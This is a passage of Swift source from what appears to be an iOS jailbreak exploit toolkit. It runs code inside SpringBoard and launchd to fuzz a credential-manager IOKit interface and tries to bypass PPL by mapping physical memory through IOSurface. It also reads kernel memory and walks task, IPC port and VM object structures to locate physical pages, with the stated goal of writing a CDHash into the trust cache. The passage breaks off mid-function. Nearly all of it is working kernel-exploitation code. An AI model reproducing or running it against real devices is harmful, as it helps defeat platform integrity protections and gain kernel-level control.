        let scalarOut = mem + 0x2A00
        let scalarOutCnt = mem + 0x2C00
        
        let baseline: UInt64 = 0xfffffffd  // known return for sel 0
        
        // ═══ TEST 1: Vary struct input SIZE ═══
        detail += "=== Test 1: Vary struct size (sel 0) ===\n"
        let sizes: [UInt64] = [0, 4, 8, 12, 16, 20, 24, 32, 48, 64, 96, 128, 192, 256, 384, 512, 1024, 2048]
        
        for size in sizes {
            // Zero-fill input
            for i in stride(from: 0, to: min(Int(size), 256), by: 8) {
                sb[structIn + UInt64(i)].setValue64(0)
            }
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 0,
                                         size == 0 ? 0 : structIn, size,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret != baseline {
                detail += "  !! size=\(size): ret=0x\(String(format: "%x", ret)), outSize=\(outSize)\n"
                findings.append(("size=\(size)", ret))
                if ret == 0 {
                    detail += "     SUCCESS! Method accepted this size!\n"
                    // Read output
                    if outSize > 0 && outSize <= 64 {
                        var buf = [UInt8](repeating: 0, count: Int(outSize))
                        sb.remoteRead(structOut, to: &buf, size: outSize)
                        detail += "     output: \(buf.prefix(16).map { String(format: "%02x", $0) }.joined(separator: " "))\n"
                    }
                }
            } else {
                // Same as baseline — note but don't print all
                if size <= 32 || size == 512 || size == 2048 {
                    detail += "  size=\(size): ret=0xfffffffd (baseline)\n"
                }
            }
        }
        
        // ═══ TEST 2: Vary CONTENT at fixed size 32 ═══
        detail += "\n=== Test 2: Vary content (size=32) ===\n"
        let contentPatterns: [(String, [UInt64])] = [
            ("all_0x41", [0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141]),
            ("incrementing", [0x0102030405060708, 0x090A0B0C0D0E0F10, 0x1112131415161718, 0x191A1B1C1D1E1F20]),
            ("ptr_pattern", [0x0000000100000001, 0x0000000200000002, 0, 0]),
            ("mach_msg_hdr", [0x00000013_00000000, 0x00000000_00000001, 0, 0]),  // fake mach msg
            ("xpc_dict", [0x0000F000_58504321, 0x0000000100000001, 0, 0]),  // fake XPC
            ("plist_magic", [0x6C70_7362, 0x0000_0100, 0, 0]),  // "bplist00"
            ("credential", [1, 0, 0x0000000100000000, 0]),  // type=1, version, data_ptr
            ("token_req", [0x746F6B65, 0x6E000000, 0, 0]),  // "token\0"
        ]
        
        for (name, pattern) in contentPatterns {
            for (i, val) in pattern.enumerated() {
                sb[structIn + UInt64(i * 8)].setValue64(val)
            }
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 0,
                                         structIn, 32,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret != baseline {
                detail += "  !! \(name): ret=0x\(String(format: "%x", ret)), out=\(outSize)\n"
                findings.append((name, ret))
                if ret == 0 {
                    detail += "     SUCCESS!\n"
                }
            }
        }
        
        // ═══ TEST 3: Try SCALAR method instead of struct ═══
        detail += "\n=== Test 3: Scalar method (sel 0) ===\n"
        for inputCount in [0, 1, 2, 3, 4, 5, 6] as [UInt64] {
            sb[scalarIn].setValue64(0)
            sb[scalarIn + 8].setValue64(0)
            sb[scalarIn + 16].setValue64(0)
            sb[scalarIn + 24].setValue64(0)
            sb[scalarIn + 32].setValue64(0)
            sb[scalarIn + 40].setValue64(0)
            sb[scalarOutCnt].setValue32(16)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect), 0,
                                         inputCount == 0 ? 0 : scalarIn, inputCount,
                                         scalarOut, scalarOutCnt)
            let outCnt = sb[scalarOutCnt].value32()
            
            if ret != baseline && ret != 0xe00002c2 {
                detail += "  !! scalar[\(inputCount)]: ret=0x\(String(format: "%x", ret)), outCnt=\(outCnt)\n"
                findings.append(("scalar_\(inputCount)", ret))
                if ret == 0 && outCnt > 0 {
                    let val = sb[scalarOut].value64()
                    detail += "     output[0]=0x\(String(format: "%llx", val))\n"
                }
            } else {
                detail += "  scalar[\(inputCount)]: ret=0x\(String(format: "%x", ret))\n"
            }
        }
        
        // ═══ TEST 4: Try other selectors (1-5) with struct ═══
        detail += "\n=== Test 4: Other selectors (1-5) ===\n"
        for sel in 1...5 {
            sb[structIn].setValue64(0)
            sb[structIn + 8].setValue64(0)
            sb[structIn + 16].setValue64(0)
            sb[structIn + 24].setValue64(0)
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), UInt64(sel),
                                         structIn, 32,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret == 0 {
                detail += "  !! sel \(sel): SUCCESS! outSize=\(outSize)\n"
                findings.append(("sel_\(sel)", ret))
            } else if ret == baseline {
                detail += "  sel \(sel): ret=0xfffffffd (same as sel 0)\n"
            } else if ret != 0xe00002bc && ret != 0xe00002c2 {
                detail += "  sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                findings.append(("sel_\(sel)", ret))
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        
        // ═══ SUMMARY ═══
        detail += "\n=== FINDINGS ===\n"
        detail += "Baseline (sel 0, any input): 0xfffffffd (-3)\n"
        detail += "Deviations found: \(findings.count)\n"
        for (desc, ret) in findings {
            detail += "  \(desc): 0x\(String(format: "%x", ret))\n"
        }
        
        if findings.isEmpty {
            detail += "\nAll inputs return same -3. Method has single validation check\n"
            detail += "that fails regardless of input content/size.\n"
            detail += "Likely checks for a valid credential token we don't have.\n"
        } else {
            detail += "\nDIFFERENT RETURNS FOUND! This indicates:\n"
            detail += "- Different code paths reachable with different inputs\n"
            detail += "- Potential for finding valid input that passes checks\n"
            detail += "- Memory corruption possible if size-dependent\n"
        }
        
        let success = !findings.isEmpty
        return ExperimentResult(name: "CredMgr Deep Fuzz", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 68: PPL Bypass via IOSurface Physical Memory
    
    /// PPL protects VIRTUAL memory mappings. But IOSurface can map PHYSICAL memory.
    /// If we map the same physical page that backs trust cache → bypass PPL!
    /// From SpringBoard: create IOSurface with IOSurfaceAddress = physical addr
    /// A12 PPL is software-only (no HVC/SMC) → physical mapping might bypass it
    private func expPPLPhysicalBypass() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        let mgr = dspmgr.shared
        var detail = "PPL Bypass via IOSurface Physical Memory\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Step 1: Get IOSurface functions
        let ioCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCreate"))
        let ioGetBase = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetBaseAddress"))
        let ioLock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceLock"))
        let ioUnlock = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceUnlock"))
        let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
        
        detail += "IOSurfaceCreate: \(ioCreate != 0 ? "found" : "missing")\n"
        detail += "IOSurfaceGetBaseAddress: \(ioGetBase != 0 ? "found" : "missing")\n"
        
        guard ioCreate != 0 && ioGetBase != 0 else {
            detail += "IOSurface functions not available\n"
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Create normal IOSurface first (get a known physical mapping)
        detail += "\n=== Step 2: Create reference IOSurface ===\n"
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        let dict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
        
        let refSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
        detail += "Reference surface: 0x\(String(format: "%llx", refSurface))\n"
        
        guard refSurface != 0 else {
            detail += "Cannot create reference surface\n"
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", refSurface, 0, 0)
        let refBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", refSurface)
        detail += "Reference base addr: 0x\(String(format: "%llx", refBase))\n"
        
        // Write marker to reference surface
        if refBase != 0 {
            sb[refBase].setValue64(0xDEAD_BEEF_CAFE_BABE)
            let readBack = sb[refBase].value64()
            detail += "Marker write/read: 0x\(String(format: "%llx", readBack))\n"
        }
        RootExecutor.rcall(sb, "IOSurfaceUnlock", refSurface, 0, 0)
        
        // Step 3: Try IOSurface with IOSurfaceAddress (physical address mapping)
        detail += "\n=== Step 3: IOSurface with physical address ===\n"
        
        // Try various physical addresses:
        // - 0x800000000 = typical DRAM base on A12
        // - kernel_base physical = kernel_base - gVirtBase + gPhysBase
        // We don't know exact gPhysBase, but typical values:
        // A12: gPhysBase ~ 0x800000000, gVirtBase ~ 0xfffffff007004000
        
        let kernBase = mgr.kernbase
        // Estimate physical address of kernel (rough)
        // On A12, phys = virt - 0xfffffff007004000 + 0x800000000 (approximate)
        let estimatedPhysKern = kernBase - 0xfffffff007004000 + 0x800000000
        
        let testAddresses: [(String, UInt64)] = [
            ("DRAM base (0x800000000)", 0x800000000),
            ("DRAM +1MB", 0x800100000),
            ("DRAM +16MB", 0x801000000),
            ("Estimated kernel phys", estimatedPhysKern),
            ("Zero (should fail)", 0),
        ]
        
        var anyMapped = false
        
        for (name, physAddr) in testAddresses {
            // Create dict with IOSurfaceAddress
            let addrDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
            remote_msg(sb, addrDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
            
            // Set IOSurfaceAddress = physical address
            // NSNumber with UInt64 value
            let physNum = remote_msg(sb, nsNumClass, remote_sel(sb, "numberWithUnsignedLongLong:"), physAddr, 0, 0, 0)
            remote_msg(sb, addrDict, setObj, physNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
            
            let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", addrDict)
            
            if surface != 0 {
                // Surface created! Try to get base address
                RootExecutor.rcall(sb, "IOSurfaceLock", surface, 0, 0)
                
                if ioPrefetch != 0 {
                    RootExecutor.rcall(sb, "IOSurfacePrefetchPages", surface)
                }
                
                let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", surface)
                
                if baseAddr != 0 {
                    detail += "  \(name): MAPPED! base=0x\(String(format: "%llx", baseAddr))\n"
                    anyMapped = true
                    
                    // Try to read from mapped physical memory
                    let val = sb[baseAddr].value64()
                    detail += "    Read: 0x\(String(format: "%016llx", val))\n"
                    
                    // Check if this looks like kernel memory
                    if val == 0x100000CFEEDFACF || (val & 0xFFFF000000000000) == 0xFFFF000000000000 {
                        detail += "    KERNEL DATA DETECTED!\n"
                        detail += "    PPL BYPASS VIA PHYSICAL MEMORY!\n"
                    }
                } else {
                    detail += "  \(name): surface created but base=NULL\n"
                }
                
                RootExecutor.rcall(sb, "IOSurfaceUnlock", surface, 0, 0)
            } else {
                detail += "  \(name): create FAILED (rejected)\n"
            }
        }
        
        // Step 4: Alternative — use IOSurfaceMemoryRegion = "PurpleGfxMem"
        detail += "\n=== Step 4: PurpleGfxMem region ===\n"
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        detail += "PurpleGfxMem surface: 0x\(String(format: "%llx", gfxSurface))\n"
        
        if gfxSurface != 0 {
            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
            detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
            
            if gfxBase != 0 {
                detail += "PurpleGfxMem MAPPED! This is physically contiguous memory.\n"
                detail += "Can be used for physical memory scanning.\n"
                anyMapped = true
            }
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        }
        
        // Summary
        detail += "\n=== RESULTS ===\n"
        if anyMapped {
            detail += "Physical memory mapping ACHIEVED!\n"
            detail += "Next: scan mapped memory for trust cache patterns\n"
            detail += "Then: write CDHash to trust cache → full jailbreak!\n"
        } else {
            detail += "All physical mapping attempts failed.\n"
            detail += "IOSurfaceAddress rejected from SpringBoard context.\n"
            detail += "PPL physical bypass NOT possible via this method.\n"
        }
        
        let success = anyMapped
        return ExperimentResult(name: "PPL Physical Bypass", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 69: Physical Memory Discovery
    
    /// Write unique marker to PurpleGfxMem (physically contiguous, mapped to userspace)
    /// Then from launchd (socket KRW), scan kernel memory near known addresses
    /// If we find our marker → we know the kernel virtual address of our physical page
    /// This reveals the phys↔virt relationship without needing gPhysBase!
    private func expPhysicalMemoryDiscovery(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = rc.trojanMem
        let sbMem = sb.trojanMem
        let mgr = dspmgr.shared
        var detail = "Physical Memory Discovery\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Step 1: Create PurpleGfxMem surface and write unique marker
        detail += "=== Step 1: Create PurpleGfxMem + write marker ===\n"
        
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        // Create large PurpleGfxMem surface (64KB for better chance of overlap)
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x10000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            detail += "Cannot create PurpleGfxMem surface\n"
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        
        guard gfxBase != 0 else {
            detail += "PurpleGfxMem base is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
        detail += "Size: 64KB (0x10000)\n"
        
        // Write unique marker pattern every 4KB (page boundary)
        // Use memset + direct write via RemoteCall (not pointer subscript)
        let markerBase: UInt64 = 0xD5B1017B_00000000  // "DSPLOIT" + page index
        
        // First: zero the surface via memset to ensure it's paged in
        RootExecutor.rcall(sb, "memset", gfxBase, 0, 0x10000)
        
        // Now write markers using remote_write (more reliable than subscript)
        for page in 0..<16 {
            let marker = markerBase | UInt64(page)
            let offset = UInt64(page) * 0x1000
            let writeAddr = gfxBase + offset
            // Write 8 bytes at a time via trojanMem staging
            sb[sbMem + 0x3800].setValue64(marker)
            sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
            RootExecutor.rcall(sb, "memcpy", writeAddr, sbMem + 0x3800, 16)
        }
        
        // Verify markers written (read via memcpy to trojanMem)
        RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
        let verify = sb[sbMem + 0x3900].value64()
        detail += "Marker written: 0x\(String(format: "%llx", verify))\n"
        if verify == markerBase {
            detail += "MARKERS CONFIRMED!\n\n"
        } else {
            detail += "Marker verify: expected 0x\(String(format: "%llx", markerBase)), got 0x\(String(format: "%llx", verify))\n"
            detail += "Trying IOSurfacePrefetchPages first...\n"
            let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
            if ioPrefetch != 0 {
                RootExecutor.rcall(sb, "IOSurfacePrefetchPages", gfxSurface)
                // Retry write
                RootExecutor.rcall(sb, "memset", gfxBase, 0x41, 16)
                RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
                let verify2 = sb[sbMem + 0x3900].value64()
                detail += "After prefetch+write: 0x\(String(format: "%llx", verify2))\n"
                if verify2 != 0 {
                    // Now write real markers
                    for page in 0..<16 {
                        let marker = markerBase | UInt64(page)
                        let offset = UInt64(page) * 0x1000
                        sb[sbMem + 0x3800].setValue64(marker)
                        sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
                        RootExecutor.rcall(sb, "memcpy", gfxBase + offset, sbMem + 0x3800, 16)
                    }
                    RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
                    let verify3 = sb[sbMem + 0x3900].value64()
                    detail += "Final marker: 0x\(String(format: "%llx", verify3))\n"
                }
            }
            detail += "\n"
        }
        
        // Step 2: From launchd context, scan kernel memory for our marker
        detail += "=== Step 2: Scan kernel memory for marker ===\n"
        detail += "Scanning near known accessible addresses...\n"
        
        // We know pmap_cs_allow_invalid is accessible at 0xfffffff00a0e45b8 + slide
        // Scan a small range around it (safe zone)
        let slide = mgr.kernslide
        let pmapCS = UInt64(0xfffffff00a0e45b8) + slide
        
        var foundAt: UInt64 = 0
        var foundMarker: UInt64 = 0
        
        // Scan +-8 bytes at a time in the safe zone around pmap_cs
        // Only scan very close (within same page) to avoid panic
        detail += "Scanning pmap_cs page (safe zone)...\n"
        let pageBase = pmapCS & ~0x3FFF  // 16KB page aligned
        
        for offset in stride(from: 0, to: 0x4000, by: 8) {
            let addr = pageBase + UInt64(offset)
            let val = ds_kread64(addr)
            
            // Check if this matches our marker pattern
            if (val & 0xFFFFFFFF_00000000) == markerBase {
                foundAt = addr
                foundMarker = val
                detail += "MARKER FOUND at kernel vm=0x\(String(format: "%llx", addr))!\n"
                detail += "Value: 0x\(String(format: "%llx", val))\n"
                break
            }
        }
        
        if foundAt == 0 {
            // Marker not in pmap_cs page — try IOSurface kernel object
            // The IOSurface kernel object might be findable via our proc
            detail += "Not in pmap_cs page.\n"
            detail += "Trying: read IOSurface kernel object address...\n"
            
            // IOSurface objects are tracked in IOKit registry
            // We can find them via the IOSurfaceRoot user client connection
            // The surface's kernel backing is at a known offset in the IOSurface object
            
            // Alternative: use mach_make_memory_entry to get memory object port
            // then find it in kernel via port kobject
            let makeMemEntry = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "mach_make_memory_entry_64"))
            
            if makeMemEntry != 0 {
                detail += "\nmach_make_memory_entry_64 available\n"
                
                // mach_make_memory_entry_64(task, &size, address, prot, &object, parent)
                let sizeAddr = sbMem + 0x3000
                sb[sizeAddr].setValue64(0x10000)
                let objectAddr = sbMem + 0x3010
                sb[objectAddr].setValue32(0)
                
                let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
                let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
                                              taskSelf, sizeAddr, gfxBase,
                                              3, objectAddr, 0) // VM_PROT_READ|WRITE=3
                let memObject = sb[objectAddr].value32()
                detail += "mach_make_memory_entry_64: ret=0x\(String(format: "%x", meRet)), port=\(memObject)\n"
                
                if meRet == 0 && memObject != 0 {
                    detail += "Memory entry port obtained!\n"
                    detail += "This port's kobject in kernel = our physical pages!\n"
                    
                    // Now from launchd, find this port's kobject
                    // We need SpringBoard's task address to look up the port
                    let sbProc = mgr.findProc(name: "SpringBoard")
                    if sbProc != 0 {
                        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
                        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
                        detail += "SpringBoard task: 0x\(String(format: "%llx", sbTask))\n"
                        
                        // Note: reading task internals might panic (wrong zone)
                        // But this info is useful for future reference
                        detail += "Port \(memObject) in SB's IPC space → kernel object\n"
                        detail += "Kernel object contains physical page list!\n"
                    }
                }
            }
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        // Step 3: Results
        detail += "\n=== RESULTS ===\n"
        if foundAt != 0 {
            detail += "PHYSICAL MEMORY DISCOVERED!\n"
            detail += "Our PurpleGfxMem page found at kernel vm=0x\(String(format: "%llx", foundAt))\n"
            detail += "Marker: 0x\(String(format: "%llx", foundMarker))\n"
            let pageIdx = foundMarker & 0xF
            detail += "Page index: \(pageIdx)\n"
            detail += "Physical page mapped at userspace 0x\(String(format: "%llx", gfxBase + pageIdx * 0x1000))\n"
            detail += "\nWe can now:\n"
            detail += "1. Write to this kernel address via PurpleGfxMem (userspace)\n"
            detail += "2. Kernel sees the write immediately (same physical page)\n"
            detail += "3. If trust cache is on same/nearby page → WRITE CDHASH!\n"
        } else {
            detail += "Marker NOT found in accessible kernel memory.\n"
            detail += "PurpleGfxMem physical pages are in a different region\n"
            detail += "than what socket KRW can access.\n"
            detail += "\nBut: mach_make_memory_entry gives us a port to the pages.\n"
            detail += "Future: find port kobject → get physical address list.\n"
        }
        
        let success = foundAt != 0
        return ExperimentResult(name: "Phys Memory Discovery", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 70: Extract Physical Address from Port Kobject
    
    /// We have a mach port (from mach_make_memory_entry_64) that represents
    /// our PurpleGfxMem physical pages. The port's kobject is a vm_named_entry
    /// which contains the backing VM object → physical page addresses.
    ///
    /// Chain: port → IPC entry → ipc_port → kobject (vm_named_entry)
    ///        → backing_copy (vm_object) → physical pages
    ///
    /// If we can read the physical address → we know where our writable memory is
    /// → calculate offset to trust cache → map it → FULL JAILBREAK
    private func expExtractPhysAddr(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mgr = dspmgr.shared
        let sbMem = sb.trojanMem
        var detail = "Extract Physical Address from Port Kobject\n\n"
        
        // Step 1: Create PurpleGfxMem + get memory entry port (same as exp 69)
        detail += "=== Step 1: Get memory entry port ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            detail += "Cannot create surface\n"
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        detail += "Surface base: 0x\(String(format: "%llx", gfxBase))\n"
        
        // Get memory entry port
        let sizeAddr = sbMem + 0x3000
        sb[sizeAddr].setValue64(0x4000)
        let objectAddr = sbMem + 0x3010
        sb[objectAddr].setValue32(0)
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
                                       taskSelf, sizeAddr, gfxBase, 3, objectAddr, 0)
        let memPort = sb[objectAddr].value32()
        detail += "Memory entry port: \(memPort), ret=0x\(String(format: "%x", meRet))\n"
        
        guard meRet == 0 && memPort != 0 else {
            detail += "Cannot get memory entry\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Find port's kobject in kernel
        detail += "\n=== Step 2: Find port kobject ===\n"
        
        // We need SpringBoard's task to look up the port
        let sbProc = mgr.findProc(name: "SpringBoard")
        guard sbProc != 0 else {
            detail += "Cannot find SpringBoard proc\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "SB proc: 0x\(String(format: "%llx", sbProc))\n"
        detail += "SB task: 0x\(String(format: "%llx", sbTask))\n"
        
        guard sbTask != 0 else {
            detail += "Cannot get SB task\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read IPC space from task
        // ⚠️ This might panic if task zone is not accessible!
        // But cyanide-ios does this successfully...
        detail += "\nReading IPC space (may panic if wrong zone)...\n"
        let itkSpace = ds_kread64(sbTask + UInt64(off_task_itk_space))
        detail += "itk_space: 0x\(String(format: "%llx", itkSpace))\n"
        
        if itkSpace == 0 {
            detail += "itk_space is NULL — task zone not accessible\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read IPC table from space
        let ipcTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
        detail += "IPC table: 0x\(String(format: "%llx", ipcTable))\n"
        
        if ipcTable == 0 {
            detail += "IPC table is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Look up our port in the table
        // Port name format: index << 8 | generation
        // Entry size: sizeof_ipc_entry (0x18)
        let portIndex = UInt64(memPort >> 8)
        let entryAddr = ipcTable + (portIndex * UInt64(sizeof_ipc_entry))
        detail += "Port index: \(portIndex), entry at: 0x\(String(format: "%llx", entryAddr))\n"
        
        // Read ie_object (ipc_port pointer)
        let ipcPort = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
        detail += "ipc_port: 0x\(String(format: "%llx", ipcPort))\n"
        
        if ipcPort == 0 {
            detail += "ipc_port is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read kobject from port (vm_named_entry)
        let kobject = ds_kread64(ipcPort + UInt64(off_ipc_port_ip_kobject))
        detail += "kobject (vm_named_entry): 0x\(String(format: "%llx", kobject))\n"
        
        if kobject == 0 {
            detail += "kobject is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 3: Read vm_named_entry → backing VM object
        detail += "\n=== Step 3: Read vm_named_entry ===\n"
        
        let backingCopy = ds_kread64(kobject + UInt64(off_vm_named_entry_backing_copy))
        let entrySize = ds_kread64(kobject + UInt64(off_vm_named_entry_size))
        detail += "backing_copy: 0x\(String(format: "%llx", backingCopy))\n"
        detail += "entry_size: 0x\(String(format: "%llx", entrySize))\n"
        
        if backingCopy != 0 {
            // Read VM object to find physical pages
            detail += "\n=== Step 4: Read VM object ===\n"
            
